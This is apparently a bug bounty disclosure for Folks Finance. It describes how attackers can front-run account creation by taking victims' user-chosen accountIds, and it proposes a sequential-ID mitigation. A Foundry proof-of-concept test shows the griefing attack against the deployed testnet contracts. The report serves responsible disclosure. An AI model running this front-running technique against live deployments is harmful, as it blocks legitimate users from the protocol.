# Boost \_ Folks Finance 33779 - \[Smart Contract - Medium] The account creation process can be griefed

Submitted on Mon Jul 29 2024 08:49:26 GMT-0400 (Atlantic Standard Time) by @JCN2023 for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33779

Report type: Smart Contract

Report severity: Medium

Target: <https://testnet.snowtrace.io/address/0x6628cE08b54e9C8358bE94f716D93AdDcca45b00>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

An account is required to perform any core operations in the folks finance protocol. It is the user's responsibility to choose their `accountId` that will be created. A bad actor can front-run any account creation operation on the Hub chain and create an account using the `accountId` seen in any user's tx. Therefore, the bad actor is able to grief the account creation of any other user, preventing them from being able to interact with the protocol for an arbitrary amount of time.

## Bug Description

Ignoring cross-chain components, the execution flow for account creation is as follows: `SpokeCommon::createAccount -> router/adapter/hub interactions -> AccountManager::createAccount`. It is important to note that all the account state is stored on the Hub chain, so the `AccountManager` contract on the Hub chain will store the account information for all users, even if the user is interacting via a different Spoke chain.

When creating an account, a user must supply an `accountId` that will be the identifier for the account to be created:

[SpokeCommon::createAccount](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/spoke/SpokeCommon.sol#L27-L33)

```solidity
27:    function createAccount(
28:        Messages.MessageParams memory params,
29:        bytes32 accountId, // @audit: user defined
30:        bytes32 refAccountId
31:    ) external payable nonReentrant {
32:        _doOperation(params, Messages.Action.CreateAccount, accountId, abi.encodePacked(refAccountId));
33:    }
```

The `accountId` is then validated to be non zero and must not have already been created:

[AccountManager::createAccount](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/AccountManager.sol#L35-L52)

```solidity
35:    function createAccount(
36:        bytes32 accountId,
37:        uint16 chainId,
38:        bytes32 addr,
39:        bytes32 refAccountId
40:    ) external override onlyRole(HUB_ROLE) {
41:        // check account is not already created (empty is reserved for admin)
42:        if (isAccountCreated(accountId) || accountId == bytes32(0)) revert AccountAlreadyCreated(accountId); // @audit: accountId should not be created already
43:
44:        // check address is not already registered
45:        if (isAddressRegistered(chainId, addr)) revert AddressPreviouslyRegistered(chainId, addr);
46:
47:        // check referrer is well defined
48:        if (!(isAccountCreated(refAccountId) || refAccountId == bytes32(0)))
49:            revert InvalidReferrerAccount(refAccountId);
50:
51:        // create account
52:        accounts[accountId] = true;
```

[AccountManager::isAccountCreated](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/AccountManager.sol#L217-L219)

```solidity
217:    function isAccountCreated(bytes32 accountId) public view override returns (bool) {
218:        return accounts[accountId]; // @audit: value is true if already created
219:    }
```

Since this `accountId` value is user defined, any bad actor can front-run other users' `createAccount` transactions and create accounts using those users' `accountId`s. This will result in the users' transactions reverting on line 42 in `AccountManager.sol`.

## Impact

A bad actor can consistently grief other users' `createAccount` transactions, preventing those users from interacting with the core components of the protocol for an arbitrary amount of time. The bad actor can lower the gas costs of this exploit by submitting their `createAccount` tx directly via the Hub chain (utilizing the `HubAdapter`) instead of interacting via a Spoke chain (triggering cross chain communications).

## Recommended Mitigation

I would recommend implementing an `accountId` state variable that is utilized and incremented every time a new account is created. This would be more gas intensive, but would limit the number of arbitrary values that users can supply to functions, which will in turn decrease the number of possible attack vectors.

## Proof of concept

## Proof of Concept

To run foundry POC:

* add test file to `test/` directory of a foundry repo
* add `AVAX_FUJI_RPC_URL` variable as environment var or in `.env` file
* run test with `forge test --mc FolksPOC_GriefAccountCreation`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IHUB {
    function accountManager() external view returns (address);
}

interface IAccountManager {
    function isAccountCreated(bytes32 accountId) external view returns (bool);
    function isAddressRegisteredToAccount(bytes32 account, uint16 chainId, bytes32 addr) external view returns (bool);
}

interface ISpoke {
    struct MessageParams {
        uint16 adapterId; 
        uint16 returnAdapterId; 
        uint256 receiverValue; 
        uint256 gasLimit; 
        uint256 returnGasLimit; 
    }

    function createAccount(MessageParams memory params, bytes32 accountId, bytes32 refAccountId) external payable;
    function createLoan(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint16 loanTypeId, bytes32 loanName) external payable;
}

interface ILoanManager {
    function isUserLoanActive(bytes32 loanId) external view returns (bool);
}

interface IHubAdapter {
    function sequence() external view returns (uint256);
}

contract FolksPOC_GriefAccountCreation is Test {
    uint256 avaxTestnetFork;

    string AVAX_FUJI_RPC_URL = vm.envString("AVAX_FUJI_RPC_URL");

    address constant HUB = 0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140;

    address constant HUB_ADAPTER = 0xf472ab58969709De9FfEFaeFFd24F9e90cf8DbF9;

    address constant SPOKE_COMMON = 0x6628cE08b54e9C8358bE94f716D93AdDcca45b00;

    event MessageFailed(uint16 adapterId, bytes32 indexed messageId, bytes reason);

    error AccountAlreadyCreated(bytes32 accountId);

    function setUp() public {
        avaxTestnetFork = vm.createFork(AVAX_FUJI_RPC_URL);

        vm.selectFork(avaxTestnetFork);
    }

    function testGriefAccountCreation() public {
        // user address
        address user = address(0x1234);

        // bad actor address
        address badActor = address(0x69420);

        // user pre-computes their accountId
        bytes32 userAccountId = keccak256(abi.encodePacked(user));

        // user's pre-computed accountId has not been created yet
        address accountManager = IHUB(HUB).accountManager();
        bool created = IAccountManager(accountManager).isAccountCreated(userAccountId);
        assertTrue(!created);

        // bad actor sees user's tx on Hub (part of cross-chain tx or directly on Hub chain) and front-runs tx using user's accountId
        ISpoke.MessageParams memory params = ISpoke.MessageParams({ 
            adapterId: 1,
            returnAdapterId: 1,
            receiverValue: 0,
            gasLimit: 0,
            returnGasLimit: 0
        });
        
        vm.prank(badActor);
        ISpoke(SPOKE_COMMON).createAccount(params, userAccountId, bytes32(0));

        // user's pre-computed accountId has been created by the bad actor first
        created = IAccountManager(accountManager).isAccountCreated(userAccountId);
        assertTrue(created);

        // user's account creation fails since accountId has been created
        bytes32 messageId = keccak256(abi.encodePacked(bytes32("HUB_ADAPTER_V1"), IHubAdapter(HUB_ADAPTER).sequence()));
        bytes memory reason = abi.encodeWithSelector(AccountAlreadyCreated.selector, userAccountId); // error message from failed operation

        vm.startPrank(user);
        vm.expectEmit(true, false, false, true);
        emit MessageFailed(params.adapterId, messageId, reason); 
        ISpoke(SPOKE_COMMON).createAccount(params, userAccountId, bytes32(0));
        vm.stopPrank();
    }
}
```
